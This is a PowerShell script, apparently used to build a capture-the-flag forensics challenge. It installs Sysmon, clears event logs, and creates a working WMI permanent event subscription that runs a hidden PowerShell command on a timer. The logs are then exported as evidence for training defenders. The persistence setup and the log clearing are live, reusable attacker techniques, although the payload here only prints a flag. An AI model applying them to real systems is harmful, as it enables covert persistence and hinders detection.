<#
  Phantom Subscriber — generador de evidencia (Windows Event Logs).

  Escenario (Persistence): el atacante instala una suscripcion permanente de
  eventos WMI — el triple __EventFilter + CommandLineEventConsumer +
  __FilterToConsumerBinding — para ejecutar su payload sin tocar Run keys ni
  tareas programadas. Sysmon la delata con los Event IDs 19 (WmiFilter), 20
  (WmiConsumer) y 21 (WmiBinding). El comando del consumer lleva la flag.

  Flag por env SI_FLAG. Vive en el CommandLineTemplate del consumer (Sysmon 20).
  MITRE: T1546.003 (Event Triggered Execution: WMI Event Subscription), T1059.001.
#>
param([string]$OutDir = "C:\evidence")
$ErrorActionPreference = "Continue"
$Flag = $env:SI_FLAG; if (-not $Flag) { $Flag = "NORTHWIND{unset_flag}" }
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

Write-Host "[*] 1/5 Script Block Logging..."
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1

Write-Host "[*] 2/5 Instalando Sysmon (registra WMI: eventos 19/20/21)..."
try {
  Invoke-WebRequest -UseBasicParsing -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
  Expand-Archive "$env:TEMP\Sysmon.zip" -DestinationPath "$env:TEMP\sysmon" -Force
  Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "$env:TEMP\sysmonconfig.xml"
  & "$env:TEMP\sysmon\Sysmon64.exe" -accepteula -i "$env:TEMP\sysmonconfig.xml" | Out-Null
  Start-Sleep -Seconds 5
} catch { Write-Host "[!] Sysmon no disponible: $_" }

Write-Host "[*] 3/5 Limpiando logs (evidencia enfocada)..."
wevtutil cl "Microsoft-Windows-Sysmon/Operational" 2>$null
wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
Start-Sleep -Seconds 2

Write-Host "[*] 4/5 Escenario: suscripcion permanente de eventos WMI..."
$ns = "root\subscription"
# 1) El filtro (dispara ~cada 60s sobre un contador de rendimiento)
$Filter = Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{
  Name           = "PhantomFilter"
  EventNamespace = "root\cimv2"
  QueryLanguage  = "WQL"
  Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
# 2) El consumer: su CommandLineTemplate esconde la flag (lo registra Sysmon 20)
$cmd = "powershell.exe -NoProfile -w hidden -c `"`$beacon='$Flag'; Write-Output `$beacon`""
$Consumer = Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{
  Name                = "PhantomConsumer"
  ExecutablePath      = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
  CommandLineTemplate = $cmd
}
# 3) El binding que une filtro y consumer
Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{
  Filter   = $Filter
  Consumer = $Consumer
} | Out-Null
Start-Sleep -Seconds 8

Write-Host "[*] 5/5 Exportando .evtx..."
wevtutil epl "Microsoft-Windows-Sysmon/Operational" "$OutDir\Sysmon.evtx" /ow:true
wevtutil epl "Microsoft-Windows-PowerShell/Operational" "$OutDir\PowerShell.evtx" /ow:true
Get-ChildItem $OutDir | Format-Table Name, Length
